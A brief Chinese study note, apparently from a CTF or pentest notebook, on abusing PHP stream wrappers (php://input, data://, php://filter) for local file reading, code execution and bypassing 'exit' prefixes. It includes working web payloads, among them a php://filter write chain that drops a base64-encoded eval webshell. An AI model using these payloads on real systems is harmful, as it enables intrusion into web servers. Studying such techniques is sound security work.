# PHP中的协议利用

## ``php://input``

接收POST RAW 

## ``data://``

``data://text/plain,<phpcode>``

## ``php://filter``简单理解：

php://filter 是php中独有的一个协议，可以作为一个中间流来处理其他流，可以进行任意文件的读取；根据名字，filter，可以很容易想到这个协议可以用来过滤一些东西；

使用不同的参数可以达到不同的目的和效果：

| 名称                      | 描述                                                         | 备注 |
| ------------------------- | ------------------------------------------------------------ | ---- |
| resource=<要过滤的数据流>  | 指定了你要筛选过滤的数据流                                   | 必选 |
| read=<读链的筛选列表>      | 可以设定一个或多个过滤器名称，以管道符"\|"分割               | 可选 |
| write=<写链的筛选列表>     | 可以设定一个或多个过滤器名称，以管道符"\|“分割               | 可选 |
| <；两个链的筛选列表>       | 任何没有以 read= 或 write= 作前缀 的筛选器列表会视情况应用于读或写链。 |      |

> Trick： read 和write 里 可以塞垃圾字符

### string.strip_tags

### convert 转换过滤器

- base64-encode/decode

- **convert.iconv.\***

> The convert.iconv.* filters are available, if iconv support is enabled, and their use is equivalent to processing all stream data with iconv(). These filters do not support parameters, but instead expect the input and output encodings to be given as part of the filter name, i.e. either as convert.iconv.``<input-encoding>``.``<output-encoding>`` or convert.iconv.``<input-encoding>``/``<output-encoding>`` (both notations are semantically equivalent).
>
>Example #3 convert.iconv.*
>
>```php
><?php
>$fp = fopen('php://output', 'w');
>stream_filter_append($fp, 'convert.iconv.utf-16le.utf-8');
>fwrite($fp, "T\0h\0i\0s\0 \0i\0s\0 \0a\0 \0t\0e\0s\0t\0.\0\n\0");
>fclose($fp);
>/* Outputs: This is a test. */
>?>
>```

简单来说``convert.iconv.*``相当于调用了``iconv()``

可以看这个示例

```php
<?php
echo iconv('UCS-4LE','UCS-4BE',"<?ph");
//Output:hp?<
?>
```

利用:

1. LFR/LFI

``php://filter/read=convert.base64-encode/resource=file.txt``

- ``php://input`` + POST报文php代码  (allow_url_include=On)

- ``data://text/plain,<phpcode>`` (allow_url_include=On)


2. 绕过死亡exit,关键词检测 

Example:

```
php://filter/write=string.strip_tags|convert.base64-decode/resource=?>PD9waHAgQGV2YWwoJF9QT1NUW1FmdG1dKT8+/../Qftm.php
```


## 参考资料

谈一谈php://filter的妙用:https://www.leavesongs.com/PENETRATION/php-filter-magic.html

php 可用过滤器列表 ：https://www.php.net/manual/en/filters.php

探索php://filter在实战当中的奇技淫巧 ： https://www.anquanke.com/post/id/202510